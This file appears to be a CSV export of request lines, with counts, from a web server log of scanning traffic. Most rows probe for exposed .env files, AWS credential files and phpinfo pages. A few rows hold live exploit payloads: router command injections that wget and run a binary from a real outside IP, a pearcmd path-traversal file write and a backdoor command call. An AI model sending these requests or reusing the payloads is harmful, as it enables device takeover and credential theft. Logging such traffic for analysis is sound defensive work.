url,count
GET /config.ini.php HTTP/1.1,1
GET /file/php/info.php HTTP/1.1,1
GET /server-info.php HTTP/1.1,1
GET /_profiler/app_dev.php/phpinfo HTTP/1.1,1
GET /global.inc.php HTTP/1.1,1
GET /file/php/phpinfo HTTP/1.1,1
GET /info.json/ HTTP/1.1,1
GET /.hsenv HTTP/1.1,1
GET /.aws/secret_access_key.txt HTTP/1.1,1
GET /config.php.bak HTTP/1.1,1
GET /home/.aws/credentials HTTP/1.1,1
GET /global.json HTTP/1.1,1
GET /php-info.php HTTP/1.1,1
GET /services.yml HTTP/1.1,1
GET /config.conf HTTP/1.1,1
GET /.aws/iam/ HTTP/1.1,1
GET /.aws/ses/ HTTP/1.1,1
GET /.aws/secrets/ HTTP/1.1,1
GET /.aws/rds/ HTTP/1.1,1
GET /.aws/s3/config.json HTTP/1.1,1
GET /.aws/s3/credentials.ini HTTP/1.1,1
GET /.aws/secretsmanager/ HTTP/1.1,1
GET /.aws/keys.conf HTTP/1.1,1
GET /.aws/keypairs/ HTTP/1.1,1
GET /.aws/cloudformation/ HTTP/1.1,1
GET /env HTTP/1.1,1
GET /.env-example HTTP/1.1,1
GET /.env_bak HTTP/1.1,1
GET /.env.sample HTTP/1.1,1
GET /.env.docker HTTP/1.1,1
GET /.rbenv-gemsets HTTP/1.1,1
GET /.aws/cloudwatch/ HTTP/1.1,1
GET /.powenv HTTP/1.1,1
GET /.aws/configurations HTTP/1.1,1
GET /.aws/lambda/ HTTP/1.1,1
GET /.aws/kms/ HTTP/1.1,1
GET /.aws HTTP/1.1,1
GET /root/.aws/credentials HTTP/1.1,1
GET /.aws/config.yaml HTTP/1.1,1
GET /.pam_environment HTTP/1.1,1
GET /.aws/s3/secrets.yaml HTTP/1.1,1
GET /env.list HTTP/1.1,1
GET /environment HTTP/1.1,1
GET /.env-sample HTTP/1.1,1
GET /printenv.tmp HTTP/1.1,1
GET /.env.txt HTTP/1.1,1
GET /.env.2 HTTP/1.1,1
GET /.env.test.sample HTTP/1.1,1
GET /.env.travis HTTP/1.1,1
GET /.env.prod.local HTTP/1.1,1
GET /.rbenv-version HTTP/1.1,1
GET /.ghc.environment HTTP/1.1,1
GET /.env.development.sample HTTP/1.1,1
GET /.zshenv HTTP/1.1,1
GET /.env_old HTTP/1.1,1
GET /environment.ts HTTP/1.1,1
GET /.env.dev.local HTTP/1.1,1
GET /envrc HTTP/1.1,1
GET /.flaskenv HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://179.43.190.218/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk) HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://179.43.190.218/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.1,1
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(%22hi%22));?>+/var/tmp/index1.php HTTP/1.1,1
"POST /cmd,/ck6fup6/portal_main/pkg_init_cmd/register_main/setCookie HTTP/1.0",1
GET /WebInterface/ HTTP/1.1,1
GET /.most/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0= HTTP/1.1,1
GET /printenv HTTP/1.1,1
GET /etc/stats HTTP/1.1,1
GET /env.bak HTTP/1.1,1
GET /env.test.js HTTP/1.1,1
GET /env.prod.js HTTP/1.1,1
GET /.venv HTTP/1.1,1
GET /.env1 HTTP/1.1,1
GET /.jenv-version HTTP/1.1,1
GET /env.php HTTP/1.1,1
GET /env.txt HTTP/1.1,1
CONNECT kaisercloud.io:443 HTTP/1.1,1
